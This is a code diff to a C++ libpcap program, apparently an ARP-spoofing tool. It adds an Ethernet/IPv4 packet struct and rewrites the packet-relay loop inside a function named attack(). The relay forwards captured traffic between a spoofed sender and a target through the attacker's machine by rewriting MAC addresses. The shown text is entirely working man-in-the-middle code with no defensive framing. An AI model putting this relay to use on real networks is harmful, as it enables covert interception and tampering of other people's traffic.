@@ -2,12 +2,17 @@
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "ipv4hdr.h"
 #include "main.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
 	EthHdr eth_;
 	ArpHdr arp_;
+};
+struct EthIpv4Packet final {
+  EthHdr eth_;
+  Ipv4Hdr ip_;
 };
 #pragma pack(pop)
 
@@ -142,27 +147,36 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
 		}
-    EthHdr* spoof_packet = (EthHdr*) packet;
-    // sender from me
-    if (spoof_packet->smac_ == sender_mac && spoof_packet->dmac_ == current_mac) {
-      if (spoof_packet->type() == EthHdr::Ip4) {
+    EthIpv4Packet* spoof_packet = (EthIpv4Packet*) packet;
+    // sender -> me -> target
+    if (spoof_packet->eth_.smac() == sender_mac && spoof_packet->eth_.dmac() == current_mac) {
+      if (spoof_packet->eth_.type() == EthHdr::Ip4) {
         printf("ipv4 ");
-      } else if (spoof_packet->type() == EthHdr::Arp) {
+      } else if (spoof_packet->eth_.type() == EthHdr::Arp) {
         printf("arp ");
       } else {
-        printf("unknown (%x) ", spoof_packet->type());
+        printf("unknown (%x) ", spoof_packet->eth_.type());
       }
-      printf("packet from sender to me spoofed\n");
-      spoof_packet->dmac_ = current_mac;
-      spoof_packet->smac_ = target_mac;
+      spoof_packet->eth_.smac_ = current_mac;
+      spoof_packet->eth_.dmac_ = target_mac;
       int res = pcap_sendpacket(handle, packet, header->caplen);
 	    if (res != 0) {
 		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	    } else {
         printf("packet relayed with %d bytes\n", header->caplen);
       }
-    } else if (spoof_packet->smac_ == target_mac && spoof_packet->dmac_ == current_mac) {
-      printf("packet from target to me spoofed\n");
+    } else if (spoof_packet->eth_.smac() == target_mac && spoof_packet->eth_.dmac() == current_mac) {
+      // target -> me -> sender
+      if (spoof_packet->ip_.tip() == sender_ip) {
+        spoof_packet->eth_.smac_ = current_mac;
+        spoof_packet->eth_.dmac_ = sender_mac;
+        int res = pcap_sendpacket(handle, packet, header->caplen);
+	      if (res != 0) {
+		      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	      } else {
+          printf("packet replyed with %d bytes\n", header->caplen);
+        }
+      }
     }
 	}
   pcap_close(handle);
